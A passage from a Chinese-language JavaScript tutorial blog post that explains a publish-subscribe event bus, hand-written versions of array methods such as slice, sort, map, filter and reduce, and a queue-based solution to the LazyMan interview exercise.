class="line">  emit() &#123;&#125;, // trigger</span><br><span class="line">  off() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eventBus.on(&#x27;click&#x27;, (data) =&gt; &#123; console.log(`click: $&#123;data&#125;`) &#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(() =&gt; &#123; // 这里一般是用户触发，我这先暂时用定时器模拟</span><br><span class="line">  eventBus.emit(&#x27;click&#x27;, &#x27;来自 emit click 的数据&#x27;)</span><br><span class="line">&#125;, 2000)</span><br></pre></td></tr></table></figure><p>这就是一个最小的发布订阅模式，现在要做的就是把上面的函数补全</p><blockquote><p>这种东西跟数组有什么关系呢？实际上呢，如果你学过数据结构，你就知道这种发布订阅就是把订阅的函数放到一个数组里就好了</p></blockquote><p>在想一个函数的时候（不管是封装组件或者是其他任何东西的时候，你都要想好参数是什么，返回值是什么），当然我们现在不设计返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">const eventBus = &#123;</span><br><span class="line">  events: &#123;&#125;, // 这里为什么是一个对象呢，有可能会是 &#123; click: [], change: [], ... &#125;</span><br><span class="line">  on(eventName, fn) &#123;</span><br><span class="line">    const events = this.events[eventName]</span><br><span class="line">    events.push(fn)</span><br><span class="line">    </span><br><span class="line">    // events 默认可能为空，马上优化一下</span><br><span class="line">    // if (!this.events[eventName]) this.events[eventName] = []</span><br><span class="line">    this.events[eventName] = this.events[eventName] || []</span><br><span class="line">    this.events[eventName].push(fn)</span><br><span class="line">  &#125;,</span><br><span class="line">  emit(eventName, data) &#123;</span><br><span class="line">    const events = this.enents[eventName]</span><br><span class="line">    for(let i = 0;i&lt; events.length;i++)&#123; // 暂时不用 map，foreach</span><br><span class="line">      const fn = events[i]</span><br><span class="line">      fn()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以看到所有的复杂代码都是通过 ifelse for 循环来实现的，其他高级的东西都可以通过这两个来实现</span><br><span class="line"></span><br><span class="line">    // 可能 events 为空，所以还要加上判断</span><br><span class="line">    const events = this.events[eventName]</span><br><span class="line">    if (!events) return // 防御式编程</span><br><span class="line">    for(let i = 0;i&lt; events.length;i++)&#123;</span><br><span class="line">      events[i](data)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  off() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eventBus.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`click: <span class="subst">$&#123;data&#125;</span>`</span>) &#125;)</span><br><span class="line"></span><br><span class="line">eventBus.<span class="title function_">emit</span>(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;来自 emit click 的数据&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>上述其实我们经常写，就像我们监听浏览器中的事件一样，<code>button.addEventListener(e =&gt; &#123;&#125;)</code><br>这个 <code>e</code> 哪来的，就是上面 <code>emit</code> 的传的，可以用户触发，也可以有 <code>button.trigger(&#39;click&#39;, &#123;&#125;)</code><br>所以所有 dom 元素都自带发布订阅，或者说所有 dom 都继承发布订阅接口<br>但是上述还有取消监听 off，没有写，其实很简单，只需要从 events 里面删除事件就好了</p></blockquote><p>接下来如何从数组里面删除一个元素？</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const <span class="selector-tag">a</span> = <span class="selector-attr">[]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.splice</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.splice</span>(<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span></span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.splice</span>(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// [2]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.splice</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span></span><br><span class="line"><span class="comment">// [3, 1]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.splice</span>(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span></span><br><span class="line"><span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><blockquote><p>splice 可以在任何位置增和删，相当于上面四个 api（unshift、shift、push、pop）</p></blockquote><h2 id="再来看数组的另外7个-api"><a href="#再来看数组的另外7个-api" class="headerlink" title="再来看数组的另外7个 api"></a>再来看数组的另外7个 api</h2><h6 id="join-amp-slice-amp-sort"><a href="#join-amp-slice-amp-sort" class="headerlink" title="join&amp;slice&amp;sort"></a>join&amp;slice&amp;sort</h6><blockquote><p>array.join(‘-‘)<br>用于将数组所有元素连接成一个字符串并返回这个字符串。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 大胆猜测一下源码，手动实现一个 join</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myJoin</span> = <span class="keyword">function</span>(<span class="params">char</span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="number">0</span>] || <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">let</span> length = <span class="variable language_">this</span>.<span class="property">length</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>; i&lt; length; i++)&#123;</span><br><span class="line">      result += char + <span class="variable language_">this</span>[i]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>array.slice(beginIndex, endIndex)<br>用下标切割一个数组并返回一个新的数组对象，原始数组不会被改变。</p></blockquote><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 大胆猜测一下源码，手动实现一个 slice</span></span><br><span class="line">Array<span class="variable">.prototype</span><span class="variable">.mySlice</span> = <span class="keyword">function</span>(<span class="keyword">begin</span>, <span class="keyword">end</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> result = []</span><br><span class="line">    <span class="keyword">begin</span> = <span class="keyword">begin</span> || <span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span> = <span class="keyword">end</span> || <span class="keyword">this</span><span class="variable">.length</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="keyword">begin</span>; i&lt; <span class="keyword">end</span>; i++)&#123;</span><br><span class="line">        result<span class="variable">.push</span>(<span class="keyword">this</span>[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用这个特性，以前很多前端会用 slice 来做伪数组转换<br>因为 slice 会用 for 循环遍历然后生成一个新数组，只需要原来的数据有个 length 属性就够了</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array = Array.prototype.slice.call(fakeArray)</span><br><span class="line">或者<span class="built_in"></span></span><br><span class="line"><span class="built_in">array </span>= [].slice.call(fakeArray)</span><br></pre></td></tr></table></figure><p>ES6 看不下去这种蹩脚的转换方法，出了一个新的 api</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> = <span class="keyword">Array</span>.<span class="keyword">from</span>(fakeArray)</span><br></pre></td></tr></table></figure><blockquote><p>sort((a, b) &#x3D;&gt; a - b)，接受的函数可传可不传<br>用来排序一个数组，据说大部分语言的 sort 都是用的快排，这里先简化成选择排序把（每次都选择最小的放在前面，第二次选择第二小的放在第二个，第三次选择第三小的放在第三个……，以此类推）</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个很慢的算法(On2)</span></span><br><span class="line">Array.prototype.mySort = function(fn)&#123;</span><br><span class="line">    fn = fn || (a,b)=&gt; a-b</span><br><span class="line">    let roundCount = <span class="keyword">this</span>.length - <span class="number">1</span> <span class="comment">// 比较的轮数，不完全归纳法得出</span></span><br><span class="line">    <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; roundCount; i++)&#123;</span><br><span class="line">        let minIndex = <span class="keyword">this</span>[i]</span><br><span class="line">        <span class="keyword">for</span>(let k = i+<span class="number">1</span>; k &lt; <span class="keyword">this</span>.length; k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>( fn.call(<span class="literal">null</span>, <span class="keyword">this</span>[k],<span class="keyword">this</span>[i]) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">                [ <span class="keyword">this</span>[i], <span class="keyword">this</span>[k] ] = [ <span class="keyword">this</span>[k], <span class="keyword">this</span>[i] ] <span class="comment">// ES6 互换位置</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后在说说上面的参数，如果想从小到大排序，到底是 <code>(a, b) =&gt; a - b</code> 还是 <code>(a, b) =&gt; b - a</code> 呢，怎么记忆呢<br>答案是不需要记忆，试两次就好了，<code>[2, 3, 1].sort((a, b) =&gt; a - b)</code> 或 <code>[2, 3, 1].sort((a, b) =&gt; b - a)</code></p></blockquote><h5 id="forEach、-map、filter-和-reduce"><a href="#forEach、-map、filter-和-reduce" class="headerlink" title="forEach、 map、filter 和 reduce"></a>forEach、 map、filter 和 reduce</h5><blockquote><p>forEach</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myForEach</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">this</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="variable language_">this</span>)&#123; <span class="comment">// 注意此处有可能会是 empty，所以需要加判断</span></span><br><span class="line">            fn.<span class="title function_">call</span>(<span class="literal">undefined</span>, <span class="variable language_">this</span>[i], i, <span class="variable language_">this</span>) <span class="comment">// 这里的 this 先用 undefined 简化，其实原forEach支持改变this</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>forEach 和 for 的区别主要有两个：</p><ol><li>forEach 没法 break</li><li>forEach 用到了函数，所以每次迭代都会有一个新的函数作用域；而 for 循环只有一个作用域（著名前端面试题就是考察了这个）<a href="https://jsbin.com/?html,js,output">举例</a></li></ol></blockquote><blockquote><p>map</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myMap</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> result = []</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">this</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="variable language_">this</span>) &#123;</span><br><span class="line">            result[i] = fn.<span class="title function_">call</span>(<span class="literal">undefined</span>, <span class="variable language_">this</span>[i], i, <span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 map 和 forEach 功能差不多，区别只有返回值而已，所以我推荐忘掉 forEach，只用 map 即可（名字又短，还有返回值）。<br>想用 map 的返回值就用，不用想就放在一边。<br>那些在用 forEach 无非是不会 map，或者 forEach 名字比较直观</p></blockquote><blockquote><p>filter</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myFilter</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> result = []</span><br><span class="line">    <span class="keyword">let</span> temp</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">this</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="variable language_">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp = fn.<span class="title function_">call</span>(<span class="literal">undefined</span>, <span class="variable language_">this</span>[i], i, <span class="variable language_">this</span>) )&#123; <span class="comment">// 注意这里的 = 号操作符，是简便写法而不是书写错误</span></span><br><span class="line">                result.<span class="title function_">push</span>(<span class="variable language_">this</span>[i]) <span class="comment">// fn.call() 返回真值就 push 到返回值，没返回真值就不 push。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>reduce<br>讲了这么多，就是为了最后讲她，代码其实很简单，可能思考起来比较难<br>简单来说他是一个累加器，遍历的时候能把上一次的结果和这次进行操作，然后返回<br>举个简单例子 <code>[1,2,3,4,5].reduce((result, item) =&gt; result + item, 0)</code>，输出 15</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myReduce</span> = <span class="keyword">function</span>(<span class="params">fn, init</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> result = init</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">this</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="variable language_">this</span>) &#123;</span><br><span class="line">            result = fn.<span class="title function_">call</span>(<span class="literal">undefined</span>, result, <span class="variable language_">this</span>[i], i, <span class="variable language_">this</span>) <span class="comment">// 这个 result 至关重要</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过我们实现的源码来看，好像和之前几个 api 差不多，只是有个 result 的区别</p><p>其实正是这样，先来看看他们之前的联系</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 之前说 forEach 可以用 map 表示</span></span><br><span class="line"><span class="comment">// 现在 map 可以用 reduce 表示</span></span><br><span class="line">array2 = <span class="built_in">array</span>.<span class="built_in">map</span>( <span class="function">(<span class="params">v</span>) =&gt;</span> v+<span class="number">1</span> )</span><br><span class="line"><span class="comment">// 可以写成 </span></span><br><span class="line">array2 = <span class="built_in">array</span>.<span class="built_in">reduce</span>( <span class="function">(<span class="params">result, v</span>)=&gt;</span> &#123;</span><br><span class="line">     result.<span class="built_in">push</span>(v + <span class="number">1</span>)</span><br><span class="line">     <span class="keyword">return</span> result</span><br><span class="line">&#125;, [ ])</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filter 可以用 reduce 表示</span></span><br><span class="line">array2 = <span class="built_in">array</span>.<span class="built_in">filter</span>( <span class="function">(<span class="params">v</span>) =&gt;</span> v % <span class="number">2</span> === <span class="number">0</span> )</span><br><span class="line"><span class="comment">// 可以写成</span></span><br><span class="line">array2 = <span class="built_in">array</span>.<span class="built_in">reduce</span>( <span class="function">(<span class="params">result, v</span>)=&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">if</span>(v % <span class="number">2</span> === <span class="number">0</span>)&#123; result.<span class="built_in">push</span>(v) &#125;</span><br><span class="line">     <span class="keyword">return</span> result</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure><blockquote><p><strong>也就是说 reduce 是最核心的 api，只要搞清楚他，其他的都能表示（都能弄明白）</strong><br>基本上<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array">这里所有的 api</a>，都能够用 reduce 表示出来<br>拓展<a href="https://clojure.org/reference/transducers">Transducers</a>，<a href="https://www.google.com/search?q=site:zhihu.com+Transducers&newwindow=1&sxsrf=AJOqlzXYBS0HL9TcWM3UcBW4kAU-UvYYvQ:1678513373036&ei=3RQMZNznAdCohwOThrDoAw&ved=0ahUKEwicyubKldP9AhVQ1GEKHRMDDD0Q4dUDCA8&uact=5&oq=site:zhihu.com+Transducers&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQA0oECEEYAVCIBliIBmDjCWgBcAB4AIABlQGIAZUBkgEDMC4xmAEAoAECoAEBwAEB&sclient=gws-wiz-serp">知乎中文</a></p></blockquote><h3 id="应用三"><a href="#应用三" class="headerlink" title="应用三"></a>应用三</h3><h6 id="LazyMan"><a href="#LazyMan" class="headerlink" title="LazyMan"></a>LazyMan</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现一个LazyMan，可以按照以下方式调用:</span></span><br><span class="line"><span class="function"><span class="title">LazyMan</span><span class="params">(<span class="string">&quot;Hank&quot;</span>)</span></span></span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line">Hi! This is Hank!</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">LazyMan</span><span class="params">(<span class="string">&quot;Hank&quot;</span>)</span></span><span class="selector-class">.sleep</span>(<span class="number">10</span>)<span class="selector-class">.eat</span>(<span class="string">&quot;dinner&quot;</span>)</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">Hi! This is Hank!</span><br><span class="line"><span class="comment">//等待10秒..</span></span><br><span class="line">Wake up after <span class="number">10</span></span><br><span class="line">Eat dinner~</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">LazyMan</span><span class="params">(<span class="string">&quot;Hank&quot;</span>)</span></span><span class="selector-class">.eat</span>(<span class="string">&quot;dinner&quot;</span>)<span class="selector-class">.eat</span>(<span class="string">&quot;supper&quot;</span>)</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">Hi This is Hank!</span><br><span class="line">Eat dinner~</span><br><span class="line">Eat supper~</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">LazyMan</span><span class="params">(<span class="string">&quot;Hank&quot;</span>)</span></span><span class="selector-class">.sleepFirst</span>(<span class="number">5</span>)<span class="selector-class">.eat</span>(<span class="string">&quot;supper&quot;</span>)</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 等待5秒</span></span><br><span class="line">Wake up after <span class="number">5</span></span><br><span class="line">Hi This is Hank!</span><br><span class="line">Eat supper</span><br><span class="line"><span class="comment">// 以此类推。</span></span><br></pre></td></tr></table></figure><p>首先第一题简单</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">LazyMan</span> (<span class="params">name</span>) &#123;</span><br><span class="line"> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`Hi! This is <span class="subst">$&#123;name&#125;</span>!`</span>)   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二题也简单</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先实现，不要在意这些细节</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LazyMan</span> (<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`Hi! This is <span class="subst">$&#123;name&#125;</span>!`</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">       sleep() &#123;</span><br><span class="line">           setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Wake up after 10&#x27;</span>)</span><br><span class="line">           &#125;, <span class="number">3000</span>) <span class="comment">// 为了方便调试，暂时缩短时间</span></span><br><span class="line">           <span class="keyword">return</span> &#123;</span><br><span class="line">               eat() &#123;</span><br><span class="line">                   setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Eat dinner~&#x27;</span>)</span><br><span class="line">                   &#125;, <span class="number">3000</span>)</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三题，稍微优化一下代码，实现一个链式调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">LazyMan</span> (name) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi! This is <span class="subst">$&#123;name&#125;</span>!`</span>)</span><br><span class="line">    <span class="keyword">const</span> api = &#123;</span><br><span class="line">       <span class="title function_">sleep</span>(<span class="params"></span>) &#123;</span><br><span class="line">           <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Wake up after 10&#x27;</span>)</span><br><span class="line">           &#125;, <span class="number">3000</span>) <span class="comment">// 为了方便调试，暂时缩短时间</span></span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;, </span><br><span class="line">       <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">           <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Eat dinner~&#x27;</span>)</span><br><span class="line">           &#125;, <span class="number">3000</span>)</span><br><span class="line">           <span class="keyword">return</span> api</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> api</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四题，也是最难的一题，因为下来的 sleepFirst 要在所有函数前执行，目前根本做不到，所以现在的代码要推倒重来<del>（就像产品经理说我们要做一个很像百度的需求，前面的需求都很简单，最后突然插入说我们要在前面加一个搜索框就行了，能搜索产品内的任何东西，这时开发就傻了，你怎么不一开始就说做一个百度或淘宝，前面的需求这么简单，后面成吨的需求砸过来）</del>，所以要用队列上场了</p><blockquote><p>分析一下问题：我们拿到函数以后不能立马执行，需要到某个时候才能做？<br>很像上面的发布订阅把<br>因为 sleepFirst 在后面调用，所以不能常规执行函数，我们需要一个任务队列（不叫数组），才可以让 sleepFirst 插队</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先收集所有的任务</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LazyMan</span> (<span class="params">name</span>) &#123;</span><br><span class="line">    const <span class="built_in">array</span> = []</span><br><span class="line">    const fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`Hi! This is <span class="subst">$&#123;name&#125;</span>!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span 